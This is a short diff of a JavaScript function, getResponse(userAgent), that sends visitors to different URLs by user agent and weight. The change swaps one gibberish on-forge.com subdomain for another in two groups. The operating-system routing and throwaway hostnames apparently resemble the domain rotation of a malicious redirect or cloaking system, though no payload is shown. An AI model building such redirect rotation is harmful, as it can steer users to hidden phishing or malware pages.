@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://sdfghjjhgfdsfghj.on-forge.com/",
-            others: "https://sdfghjjhgfdsfghj.on-forge.com/"
+            macos: "https://xfhgfdssdfgghg.on-forge.com/",
+            others: "https://xfhgfdssdfgghg.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://sdfghjjhgfdsfghj.on-forge.com/",
-            others: "https://sdfghjjhgfdsfghj.on-forge.com/"
+            macos: "https://xfhgfdssdfgghg.on-forge.com/",
+            others: "https://xfhgfdssdfgghg.on-forge.com/"
         }
     ];
 
